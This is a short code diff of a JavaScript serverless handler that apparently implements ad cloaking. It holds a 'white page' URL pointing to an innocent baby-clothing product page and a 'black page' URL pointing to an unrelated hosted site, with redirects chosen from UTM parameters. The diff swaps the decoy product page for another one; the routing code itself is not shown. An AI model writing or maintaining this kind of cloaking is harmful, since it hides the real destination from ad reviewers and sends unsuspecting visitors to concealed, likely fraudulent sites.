@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babymarkt.com/at/p/maximo-strickmuetze-mit-bommel-fahrzeuge-blau-orange-7949537/";
+    const whitePageURL = "https://annaandlouis.com/collections/baby-boy/products/blue-baby-romper-with-pompoms";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
